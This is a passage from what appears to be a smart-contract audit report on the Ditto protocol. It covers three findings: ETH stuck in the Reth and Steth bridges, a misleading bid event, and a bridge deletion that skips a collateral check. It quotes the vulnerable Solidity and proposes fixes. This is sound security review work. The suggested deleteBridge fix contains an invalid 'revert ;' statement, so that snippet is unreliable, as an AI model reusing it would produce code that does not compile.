- as an option,consider modifying **Reth** derivative to obtain rETH only through the UniswapV3 pool(E.I) when users **deposit** eth, on average users will get less rETH due to the slippage, but will avoid any future issues with the deposit delay mechanism.
## <a id='M-04'></a>M-04. there is now withdraw mechanism for ETH in bridge contracts            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-09-ditto

## Summary

- The bridge contracts `Reth` and `Steth` lack a mechanism for withdrawing Ethereum (ETH), posing a risk of permanent loss for any ETH sent to these contracts. These contracts are used in conjunction with staking ETH protocols like RocketPool and Lido.

## Vulnerability Details

The vulnerability arises due to the absence of a **withdraw** function or any method to retrieve ETH from the `Reth` and `Steth` bridge contracts. The contracts deals with staking eth protocols **Rocket pool** and **Lido**,and have a `receive()` function. but do not provide a means to access ETH stored within them. Since these contracts are not upgradeable and Separate from the **diamond**, any ETH in them get lost forever. also the stucked eth can't be staked to Benefit the system since the staking process depends on  `msg.value`  only :

```solidity
  // from Reth bridge :
  function depositEth() external payable onlyDiamond returns (uint256) {
        IRocketDepositPool rocketDepositPool =
            IRocketDepositPool(rocketStorage.getAddress(ROCKET_DEPOSIT_POOL_TYPEHASH));
        IRocketTokenRETH rocketETHToken = _getRethContract();

        uint256 originalBalance = rocketETHToken.balanceOf(address(this));
        rocketDepositPool.deposit{value: msg.value}();
        uint256 netBalance = rocketETHToken.balanceOf(address(this)) - originalBalance;
        if (netBalance == 0) revert NetBalanceZero();

        return rocketETHToken.getEthValue(netBalance);
    }
  // from Steth bridge :
  function depositEth() external payable onlyDiamond returns (uint256) {
        uint256 originalBalance = steth.balanceOf(address(this));
        // @edv address(0) means no fee taken by the referring protocol
        steth.submit{value: msg.value}(address(0));
        uint256 netBalance = steth.balanceOf(address(this)) - originalBalance;
        if (netBalance == 0) revert NetBalanceZero();
        return netBalance;
    }
```

## Impact

- the native token `eth` in the bridge contracts `BridgeReth` `BridgeSteth` will be lost for ever.

## Tools Used

Manual review

## Recommendations

add a withdraw function that controlled by the _DAO_ , or insure that the contract don't have any remaining eth in the `deposit` , and `unstake` process.

# Low Risk Findings

## <a id='L-01'></a>L-01. Incorrect emmited event             

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-09-ditto

## Summary

The `_createBid` function in the `BidOrdersFacet` contract  often emits the wrong bid `id` or even Emit the Event `CreateBid` while no bid was created in case of **marketOrder**.

## Vulnerability Details

Within the `_createBid` function, the emitted `id` for a bid is determined by `s.asset[asset].orderId`. However, this value is not always accurate due to its dependency on various limits such as `shorts_limits`, `asks_limits`, and `bids_limits`. Consequently, the emitted `id` may not align with the actual bid created, leading to discrepancies between the emitted event and the recorded bid. and In numerous cases, the bid does not get created at all, making the emitted event erroneous and misleading.

Here's the relevant code snippet illustrating the issue:

```solidity
STypes.Order memory incomingBid;
incomingBid.addr = sender;
incomingBid.price = price;
incomingBid.ercAmount = ercAmount;
incomingBid.id = Asset.orderId; // Incorrectly emits this id, leading to discrepancies
incomingBid.orderType = isMarketOrder ? O.MarketBid : O.LimitBid;
incomingBid.creationTime = LibOrders.getOffsetTime();
MTypes.BidMatchAlgo memory b;
b.oraclePrice = LibOracle.getPrice(asset);
b.askId = s.asks[asset][Constants.HEAD].nextId;
b.shortHintId = b.shortId = Asset.startingShortId;
// emit the asset.orderId regardless of potential modifications or non-creation of the bid
emit Events.CreateBid(asset, sender, incomingBid.id, incomingBid.creationTime);
```
- In essence, the function emits the `asset.orderId` regardless of whether the order will be modified due to inactive orders or if the bid won't be created at all, especially in the case of `market orders`.
## <a id='L-02'></a>L-02. can be delete a bridge that holds some collateral            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-09-ditto

## summary :

- In the `ownerFacet` contract's `deleteBridge` function, the DAO has the ability to delete a bridge that holds collateral (e.g., reth or steth bridges) without checking if the bridge contains any value. This presents a potential risk, as bridges with collateral should not be deleted inadvertently.

## Vulnerability Details:

- The vulnerability lies in the `ownerFacet` contract's `deleteBridge` function. This function allows the DAO to delete bridge contracts without verifying whether the bridge contains any collateral (e.g., assets like reth or steth). The existing function lacks a check to ensure that bridges being deleted hold valuable assets before allowing their deletion.

```solidity
function deleteBridge(address bridge) external onlyDAO {
   uint256 vault = s.bridge[bridge].vault;
   if (vault == 0) revert Errors.InvalidBridge();

   // ...

   delete s.bridge[bridge];
   emit Events.DeleteBridge(bridge);
}
```

## impact :

1. The inaccurate deletion of bridge contracts can significantly impact the calculation of the yield rate within the system. Erroneously deleted bridges may lead to incorrect yield rate calculations, affecting the overall financial stability and investment decisions of users.

2.  Users withdrawing assets from the system will receive diminished value due to the loss incurred from bridges without collateral. The financial loss caused by these deletions will be spread across all users, leading to reduced withdrawal values for everyone participating in the system.

3.  The system is at risk of losing its real collateral, potentially leading to undercollateralization. Bridges without proper collateral may weaken the system's ability to cover outstanding liabilities

## Recommendations

enhance the `deleteBridge()` function by incorporating a collateral check.

```solidity
function deleteBridge(address bridge) external onlyDAO {
    uint256 vault = s.bridge[bridge].vault;
    if (vault == 0) revert Errors.InvalidBridge();

    // Ensure the bridge not holds collateral before deletion.
    if (IBridge(bridge).getZethValue() > 0) revert ;

    // ...

    delete s.bridge[bridge];
    emit Events.DeleteBridge(bridge);
}
```


